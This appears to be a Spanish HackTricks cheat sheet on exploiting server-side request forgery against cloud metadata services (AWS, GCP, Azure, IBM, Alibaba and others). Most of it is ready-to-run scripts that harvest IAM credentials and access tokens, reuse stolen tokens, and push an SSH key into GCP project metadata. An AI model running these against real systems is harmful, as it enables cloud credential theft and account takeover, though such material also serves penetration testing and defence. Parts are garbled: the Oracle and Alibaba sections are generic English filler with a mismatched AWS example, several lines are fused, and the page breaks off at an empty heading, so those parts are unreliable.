# Cloud SSRF

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## AWS

### Abusando de SSRF en el entorno de AWS EC2

**La metadata** se puede acceder desde cualquier m√°quina EC2 y ofrece informaci√≥n interesante sobre ella. Es accesible en la URL: `http://169.254.169.254` ([informaci√≥n sobre la metadata aqu√≠](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)).

Hay **2 versiones** de la metadata. La **primera** permite **acceder** a la metadata mediante solicitudes **GET** (por lo que cualquier SSRF puede explotarla). Para la **versi√≥n 2**, [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), debes solicitar un **token** enviando una solicitud **PUT** con una **cabecera HTTP** y luego usar ese token para acceder a la metadata con otra cabecera HTTP (por lo que es **m√°s complicado de abusar** con un SSRF).

En la **versi√≥n 2**, el **TTL de la solicitud PUT por defecto es 1**. Esto asegura que los dispositivos de red mal configurados (firewalls, dispositivos NAT, enrutadores, etc.) no reenviar√°n el paquete. Esto tambi√©n significa que los contenedores de Docker que utilizan la configuraci√≥n de red predeterminada (modo puente) **no podr√°n acceder** al servicio de metadata de la instancia.\
**IMDSv2** tambi√©n **bloquear√° las solicitudes para obtener un token que incluyan la cabecera `X-Forwarded-For`**. Esto es para evitar que los proxies inversos mal configurados puedan acceder a ella.

Puedes encontrar informaci√≥n sobre los [puntos finales de la metadata en la documentaci√≥n](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html). En el siguiente script se obtiene informaci√≥n interesante de ella:
```bash
EC2_TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
URL="http://169.254.169.254/latest/meta-data"

aws_req=""
if [ "$(command -v curl)" ]; then
aws_req="curl -s -f -H '$HEADER'"
elif [ "$(command -v wget)" ]; then
aws_req="wget -q -O - -H '$HEADER'"
else
echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
fi

printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

echo ""
echo "Account Info"
eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
eval $aws_req "http://169.254.169.254/latest/dynamic/instance-identity/document"; echo ""

echo ""
echo "Network Info"
for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do
echo "Mac: $mac"
printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
echo ""
done

echo ""
echo "IAM Role"
eval $aws_req "$URL/iam/info"
for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do
echo "Role: $role"
eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
echo ""
done

echo ""
echo "User Data"
# Search hardcoded credentials
eval $aws_req "http://169.254.169.254/latest/user-data"

echo ""
echo "EC2 Security Credentials"
eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
```
Como ejemplo de credenciales IAM **p√∫blicamente disponibles**, puedes visitar: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

Tambi√©n puedes verificar las credenciales de seguridad **p√∫blicas de EC2** en: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)

Luego puedes tomar **esas credenciales y usarlas con AWS CLI**. Esto te permitir√° hacer **cualquier cosa que el rol tenga permisos** para hacer.

Para aprovechar las nuevas credenciales, deber√°s crear un nuevo perfil de AWS como este:
```
[profilename]
aws_access_key_id = ASIA6GG7PSQG4TCGYYOU
aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT5pUkyPJsjC
aws_session_token = AgoJb3JpZ2luX2VjEGcaCXVzLXdlc3QtMiJHMEUCIHgCnKJl8fwc+0iaa6n4FsgtWaIikf5mSSoMIWsUGMb1AiEAlOiY0zQ31XapsIjJwgEXhBIW3u/XOfZJTrvdNe4rbFwq2gMIYBAAGgw5NzU0MjYyNjIwMjkiDCvj4qbZSIiiBUtrIiq3A8IfXmTcebRDxJ9BGjNwLbOYDlbQYXBIegzliUez3P/fQxD3qDr+SNFg9w6WkgmDZtjei6YzOc/a9TWgIzCPQAWkn6BlXufS+zm4aVtcgvBKyu4F432AuT4Wuq7zrRc+42m3Z9InIM0BuJtzLkzzbBPfZAz81eSXumPdid6G/4v+o/VxI3OrayZVT2+fB34cKujEOnBwgEd6xUGUcFWb52+jlIbs8RzVIK/xHVoZvYpY6KlmLOakx/mOyz1tb0Z204NZPJ7rj9mHk+cX/G0BnYGIf8ZA2pyBdQyVbb1EzV0U+IPlI+nkIgYCrwTCXUOYbm66lj90frIYG0x2qI7HtaKKbRM5pcGkiYkUAUvA3LpUW6LVn365h0uIbYbVJqSAtjxUN9o0hbQD/W9Y6ZM0WoLSQhYt4jzZiWi00owZJjKHbBaQV6RFwn5mCD+OybS8Y1dn2lqqJgY2U78sONvhfewiohPNouW9IQ7nPln3G/dkucQARa/eM/AC1zxLu5nt7QY8R2x9FzmKYGLh6sBoNO1HXGzSQlDdQE17clcP+hrP/m49MW3nq/A7WHIczuzpn4zv3KICLPIw2uSc7QU6tAEln14bV0oHtHxqC6LBnfhx8yaD9C71j8XbDrfXOEwdOy2hdK0M/AJ3CVe/mtxf96Z6UpqVLPrsLrb1TYTEWCH7yleN0i9koRQDRnjntvRuLmH2ERWLtJFgRU2MWqDNCf2QHWn+j9tYNKQVVwHs3i8paEPyB45MLdFKJg6Ir+Xzl2ojb6qLGirjw8gPufeCM19VbpeLPliYeKsrkrnXWO0o9aImv8cvIzQ8aS1ihqOtkedkAsw=
```
Observa el **aws\_session\_token**, esto es indispensable para que el perfil funcione.

[**PACU**](https://github.com/RhinoSecurityLabs/pacu) se puede utilizar con las credenciales descubiertas para conocer tus privilegios e intentar escalar privilegios.

### SSRF en las credenciales de AWS ECS (Servicio de contenedores)

**ECS**, es un grupo l√≥gico de instancias EC2 en las que puedes ejecutar una aplicaci√≥n sin tener que escalar tu propia infraestructura de gesti√≥n de cl√∫steres, ya que ECS se encarga de eso por ti. Si logras comprometer el servicio que se ejecuta en **ECS**, los **puntos finales de metadatos cambian**.

Si accedes a _**http://169.254.170.2/v2/credentials/\<GUID>**_ encontrar√°s las credenciales de la m√°quina ECS. Pero primero necesitas **encontrar el \<GUID>**. Para encontrar el \<GUID> debes leer la variable **environ** **AWS\_CONTAINER\_CREDENTIALS\_RELATIVE\_URI** dentro de la m√°quina.\
Podr√≠as ser capaz de leerlo explotando una **traves√≠a de ruta** a `file:///proc/self/environ`\
La direcci√≥n http mencionada deber√≠a darte la **AccessKey, SecretKey y token**.
```bash
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
```
{% hint style="info" %}
Ten en cuenta que en **algunos casos** podr√°s acceder a la **instancia de metadatos de EC2** desde el contenedor (verifica las limitaciones de TTL de IMDSv2 mencionadas anteriormente). En estos escenarios, desde el contenedor podr√≠as acceder tanto al rol IAM del contenedor como al rol IAM de EC2.
{% endhint %}

### SSRF para AWS Lambda <a href="#6f97" id="6f97"></a>

En este caso, las **credenciales se almacenan en variables de entorno**. Por lo tanto, para acceder a ellas, debes acceder a algo como **`file:///proc/self/environ`**.

Los **nombres** de las **variables de entorno interesantes** son:

* `AWS_SESSION_TOKEN`
* `AWS_SECRET_ACCESS_KEY`
* `AWS_ACCES_KEY_ID`

Adem√°s, adem√°s de las credenciales IAM, las funciones Lambda tambi√©n tienen **datos de eventos que se pasan a la funci√≥n cuando se inicia**. Estos datos est√°n disponibles para la funci√≥n a trav√©s de la [interfaz de tiempo de ejecuci√≥n](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html) y podr√≠an contener **informaci√≥n sensible** (como en **stageVariables**). A diferencia de las credenciales IAM, estos datos son accesibles a trav√©s de SSRF est√°ndar en **`http://localhost:9001/2018-06-01/runtime/invocation/next`**.

{% hint style="warning" %}
Ten en cuenta que las **credenciales de lambda** est√°n dentro de las **variables de entorno**. Por lo tanto, si el **rastro de pila** del c√≥digo lambda imprime las variables de entorno, es posible **filtrarlas provocando un error** en la aplicaci√≥n.
{% endhint %}

### SSRF URL para AWS Elastic Beanstalk <a href="#6f97" id="6f97"></a>

Recuperamos el `accountId` y `region` de la API.
```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
Luego recuperamos el `AccessKeyId`, `SecretAccessKey` y `Token` de la API.
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
![](https://miro.medium.com/max/60/0\*4OG-tRUNhpBK96cL?q=20) ![](https://miro.medium.com/max/1469/0\*4OG-tRUNhpBK96cL)

Luego usamos las credenciales con `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.

## GCP <a href="#6440" id="6440"></a>

Puedes [**encontrar aqu√≠ la documentaci√≥n sobre los puntos finales de metadatos**](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata).

### URL SSRF para Google Cloud <a href="#6440" id="6440"></a>

Requiere el encabezado "Metadata-Flavor: Google" o "X-Google-Metadata-Request: True" y puedes acceder al punto final de metadatos con las siguientes URLs:

* http://169.254.169.254
* http://metadata.google.internal
* http://metadata

Puntos finales interesantes para extraer informaci√≥n:
```bash
# /project
# Project name and number
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# Project attributes
curl -H "X-Google-Metadata-Request: True" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# Network Interfaces
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do
echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
echo "  ==============  "
done
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
echo "  Name: $sa"
echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
echo "  ==============  "
done
# K8s Attributtes
## Cluster location
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## Cluster name
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# All custom project attributes
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"

# All custom project attributes instance attributes
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"
```
Beta NO requiere un encabezado en este momento (gracias Mathias Karlsson @avlidienbrunn)
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```
{% hint style="danger" %}
Para **utilizar el token de la cuenta de servicio exfiltrada**, simplemente puedes hacer lo siguiente:
```bash
# Via env vars
export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
gcloud projects list

# Via setup
echo "<token>" > /some/path/to/token
gcloud config set auth/access_token_file /some/path/to/token
gcloud projects list
gcloud config unset auth/access_token_file
```
{% endhint %}

### Agregar una clave SSH <a href="#3e24" id="3e24"></a>

Extraer el token
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```
Verifique el alcance del token
```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  {
"issued_to": "101302079XXXXX",
"audience": "10130207XXXXX",
"scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
"expires_in": 2443,
"access_type": "offline"
}
```
Ahora empuja la clave SSH.

{% code overflow="wrap" %}
```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
-H "Content-Type: application/json"
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```
{% endcode %}

## Digital Ocean <a href="#9f1f" id="9f1f"></a>

{% hint style="warning" %}
No existen cosas como AWS Roles o cuentas de servicio de GCP, as√≠ que no esperes encontrar credenciales de bot de metadatos.
{% endhint %}

Documentaci√≥n disponible en [`https://developers.digitalocean.com/documentation/metadata/`](https://developers.digitalocean.com/documentation/metadata/)
```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```
## Azure <a href="#cea8" id="cea8"></a>

### Azure VM

[**Documentaci√≥n** aqu√≠](https://learn.microsoft.com/es-es/azure/virtual-machines/windows/instance-metadata-service?tabs=linux).

* **Debe** contener el encabezado `Metadata: true`
* No debe contener un encabezado `X-Forwarded-For`

{% tabs %}
{% tab title="Bash" %}
{% code overflow="wrap" %}
```bash
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions

echo "Instance details"
curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"

echo "Load Balancer details"
curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"

echo "Management Token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"

echo "Graph token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"

echo "Vault token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"

echo "Storage token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
```
{% endcode %}
{% endtab %}

{% tab title="PS" %}
```bash
# Powershell
Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
## User data
$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

# Paths
/metadata/instance?api-version=2017-04-02
/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```
{% endtab %}
{% endtabs %}

### Azure App Service

Desde la variable **env** puedes obtener los valores de `IDENTITY_HEADER` _y_ `IDENTITY_ENDPOINT`. Que puedes usar para obtener un token para comunicarte con el servidor de metadatos.

La mayor√≠a de las veces, quieres un token para uno de estos recursos:

* [https://storage.azure.com](https://storage.azure.com/)
* [https://vault.azure.net](https://vault.azure.net/)
* [https://graph.microsoft.com](https://graph.microsoft.com/)
* [https://management.azure.com](https://management.azure.com/)
```bash
# Check for those env vars to know if you are in an Azure app
echo $IDENTITY_HEADER
echo $IDENTITY_ENDPOINT

# You should also be able to find the folder:
ls /opt/microsoft
#and the file
ls /opt/microsoft/msodbcsql17

# Get management token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
# Get graph token
curl "$IDENTITY_ENDPOINT?resource=https://graph.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# API
# Get Subscriptions
URL="https://management.azure.com/subscriptions?api-version=2020-01-01"
curl -H "Authorization: $TOKEN" "$URL"
# Get current permission on resources in the subscription
URL="https://management.azure.com/subscriptions/<subscription-uid>/resources?api-version=2020-10-01'"
curl -H "Authorization: $TOKEN" "$URL"
# Get permissions in a VM
URL="https://management.azure.com/subscriptions/<subscription-uid>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/<VM-name>/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"
curl -H "Authorization: $TOKEN" "$URL"
```

```powershell
# API request in powershell to management endpoint
$Token = 'eyJ0eX..'
$URI='https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# API request to graph endpoint (get enterprise applications)
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# Using AzureAD Powershell module witho both management and graph tokens
$token = 'eyJ0e..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 2e91a4f12984-46ee-2736-e32ff2039abc

# Try to get current perms over resources
Get-AzResource
## The following error means that the user doesn't have permissions over any resource
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
+ CategoryInfo : CloseError: (:) [Get-AzResource],ValidationException
+ FullyQualifiedErrorId :
Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
```
## IBM Cloud <a href="#2af0" id="2af0"></a>

{% hint style="warning" %}
Ten en cuenta que en IBM, de forma predeterminada, los metadatos no est√°n habilitados, por lo que es posible que no puedas acceder a ellos incluso si est√°s dentro de una VM de IBM Cloud.
{% endhint %}

{% code overflow="wrap" %}
```bash
export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
-H "Metadata-Flavor: ibm"\
-H "Accept: application/json"\
-d '{
"expires_in": 3600
}' | jq -r '(.access_token)'`

# Get instance details
curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq

# Get SSH keys info
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq

# Get SSH keys fingerprints & user data
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq

# Get placement groups
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq

# Get IAM credentials
curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
```
{% endcode %}

## Packetcloud <a href="#2af0" id="2af0"></a>

Documentaci√≥n disponible en [`https://metadata.packet.net/userdata`](https://metadata.packet.net/userdata)

## OpenStack/RackSpace <a href="#2ffc" id="2ffc"></a>

(¬øse requiere encabezado? desconocido)
```
http://169.254.169.254/openstack
```
## HP Helion <a href="#a8e0" id="a8e0"></a>

(se requiere encabezado? desconocido)
```
http://169.254.169.254/2009-04-04/meta-data/
```
## Oracle Cloud <a href="#a723" id="a723"></a>

Oracle Cloud is a cloud computing platform provided by Oracle Corporation. It offers a wide range of cloud services, including infrastructure as a service (IaaS), platform as a service (PaaS), and software as a service (SaaS). With its robust infrastructure and comprehensive set of tools, Oracle Cloud is a popular choice for businesses looking to leverage the power of the cloud.

## Server-Side Request Forgery (SSRF) in Cloud Environments

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make requests from the server to other internal or external resources. In cloud environments, SSRF can be particularly dangerous as it can be used to access sensitive resources within the cloud infrastructure.

Cloud providers often offer metadata services that allow instances to retrieve information about themselves, such as instance metadata, user data, and access tokens. These metadata services are typically accessible via a well-known URL, such as `http://169.254.169.254`. An attacker can exploit SSRF to make requests to these metadata services and retrieve sensitive information.

## Exploiting SSRF in Oracle Cloud

To exploit SSRF in Oracle Cloud, an attacker can craft a malicious request that tricks the server into making a request to the metadata service. The attacker can then extract sensitive information from the response, such as access tokens or instance metadata.

Here is an example of a vulnerable code snippet that demonstrates SSRF in Oracle Cloud:

```python
import requests

def get_instance_metadata(url):
    response = requests.get(url)
    return response.text

def process_request(request):
    url = request.get('url')
    data = get_instance_metadata(url)
    # Process the retrieved data

# Example usage
request = {'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin'}
process_request(request)
```

In this example, the `get_instance_metadata` function makes a request to the specified URL, which is controlled by the attacker. The `process_request` function processes the retrieved data, which can include sensitive information.

To prevent SSRF attacks in Oracle Cloud, it is important to validate and sanitize all user-supplied input, especially URLs. Additionally, access to metadata services should be restricted to trusted sources only.

## Conclusion

Server-Side Request Forgery (SSRF) is a serious vulnerability that can be exploited in cloud environments, including Oracle Cloud. By understanding how SSRF works and implementing proper security measures, businesses can protect their cloud infrastructure from potential attacks.
```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```
## Alibaba <a href="#51bd" id="51bd"></a>

Alibaba is a cloud service provider based in China. It offers a wide range of services, including computing, storage, networking, and security solutions. Alibaba Cloud, also known as Aliyun, is the cloud computing arm of Alibaba Group. It provides scalable and secure cloud computing services to businesses and individuals worldwide.

Alibaba Cloud provides various services, such as Elastic Compute Service (ECS), Object Storage Service (OSS), Relational Database Service (RDS), and Content Delivery Network (CDN). These services can be used to build and deploy applications, store and retrieve data, and deliver content to end users.

As a penetration tester, it is important to understand the security risks associated with using Alibaba Cloud services. One common vulnerability that can be exploited is Server-Side Request Forgery (SSRF). SSRF is a type of vulnerability that allows an attacker to make requests from the vulnerable server to internal or external resources. This can be used to bypass security controls, access sensitive information, or perform unauthorized actions.

To prevent SSRF attacks, it is important to validate and sanitize user input, especially when making requests to external resources. Additionally, access controls should be implemented to restrict the resources that the server can access. Regular security assessments and penetration testing can help identify and mitigate SSRF vulnerabilities in Alibaba Cloud deployments.

In conclusion, Alibaba Cloud is a popular cloud service provider that offers a wide range of services. However, it is important to be aware of the security risks associated with using these services and take appropriate measures to protect against vulnerabilities like SSRF.
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```
## Kubernetes ETCD <a href="#c80a" id="c80a"></a>

Puede contener claves de API y direcciones IP y puertos internos
```
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```
## Docker <a href="#ac0b" id="ac0b"></a>
```
http://127.0.0.1:2375/v1.24/containers/jsonSimple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```
## Rancher <a href="#8cb7" id="8cb7"></a>

